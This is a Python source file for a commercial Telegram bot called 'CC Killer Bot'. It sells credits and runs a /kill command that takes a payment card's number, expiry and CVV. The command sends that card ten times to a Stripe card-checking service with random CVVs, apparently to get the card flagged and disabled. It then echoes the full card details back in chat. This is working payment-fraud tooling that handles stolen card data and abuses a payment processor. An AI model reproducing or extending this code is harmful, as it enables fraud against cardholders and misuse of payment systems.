import asyncio
import random
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from utils.data_manager import DataManager
from services.stripe_service import StripeService


class UserHandlers:
    def __init__(self, data_manager: DataManager, stripe_service: StripeService):
        self.data_manager = data_manager
        self.stripe_service = stripe_service

    def register(self, app: Client):
        @app.on_message(filters.command("start"))
        async def start_command(client, message: Message):
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("Join Channel", url="https://t.me/+tjKMDddCeSFkNjFl")],
                [InlineKeyboardButton("Contact Owner", url="https://t.me/itZdaxx")]
            ])
            welcome_text = (
                "🎯 **Welcome to CC Killer Bot**\n\n"
                "Here are some commands you can use:\n"
                "• /kill - Kill a card (10s)\n"
                "• /buy - Purchase credits\n"
                "• /info - Check your credits\n\n"
                "🔥 Join our channel for updates!"
            )
            await message.reply_text(welcome_text, reply_markup=keyboard)

        @app.on_message(filters.command("buy"))
        async def buy_command(client, message: Message):
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("Contact Owner", url="https://t.me/itZdaxx")],
                [InlineKeyboardButton("Join Channel", url="https://t.me/+tjKMDddCeSFkNjFl")]
            ])
            await message.reply_text(
                "🛒 **Buy Credits**\n\nContact @vclubdrop for purchasing credits.",
                reply_markup=keyboard
            )

        @app.on_message(filters.command("kill"))
        async def kill_command(client, message: Message):
            user_id = str(message.from_user.id)
            username = message.from_user.username

            # Owner gets unlimited credits
            is_owner = user_id == str(self.data_manager.owner_id) or username in self.data_manager.get_authorized_users()

            # Check credits if not owner
            if not is_owner and self.data_manager.get_user_credits(user_id) <= 0:
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("Buy Credits", url="https://t.me/vclubdrop")]
                ])
                await message.reply_text("❌ You don't have enough credits to kill.", reply_markup=keyboard)
                return

            try:
                # Normalize delimiters in the card details
                card_details = message.text.split(" ", 1)[1].strip()
                card_details = card_details.replace("/", "|")  # Replace '/' with '|'

                if not card_details or len(card_details.split("|")) != 4:
                    await message.reply_text("❌ Provide a valid card in the format: /kill cc|mm|yyyy|cvv or /kill cc/mm/yyyy/cvv")
                    return

                cc, mm, yyyy, original_cvv = card_details.split("|")  # Keep the original CVV for the response

                # Process card 10 times with random CVVs
                for _ in range(10):
                    random_cvv = f"{random.randint(100, 999):03}"  # Generate a random 3-digit CVV
                    card_to_check = f"{cc}|{mm}|{yyyy}|{random_cvv}"
                    result = self.stripe_service.check_card(card_to_check)
                    # Simulate delay if necessary (e.g., for Stripe API rate limits)
                    await asyncio.sleep(1)

                response = (
                    "┏━━━━━━━⍟\n"
                    "┃**#CC_KILLER☠**\n"
                    "┗━━━━━━━━━━━⊛\n\n"
                    f"**💳 CC: `{cc}|{mm}|{yyyy}|{original_cvv}`**\n"  # Use the original CVV here
                    f"**✨ STATUS: Completed 🎉**\n"
                    f"**🕒 KILL TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
                    "**🤖 BOT BY: @vclubdrop**\n\n"
                    "**✅ Thank you for using the bot! Join our Channel for more updates!**"
                )

                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Channel", url="https://t.me/+tjKMDddCeSFkNjFl")],
                    [InlineKeyboardButton("Buy Credits", url="https://t.me/itzDaxx")]
                ])

                if not is_owner:
                    self.data_manager.remove_credits(user_id, 1)

                await message.reply_text(response, reply_markup=keyboard)

            except IndexError:
                await message.reply_text("❌ Usage: /kill `cc|mm|yyyy|cvv`")
            except Exception as e:
                await message.reply_text(f"❌ An error occurred: {e}")

        @app.on_message(filters.command("info"))
        async def info_command(client, message: Message):
            user_id = str(message.from_user.id)
            credits = self.data_manager.get_user_credits(user_id)
            await message.reply_text(f"ℹ️ **Your Credits:** `{credits}`\n\n**✅ Stay tuned for updates!**")

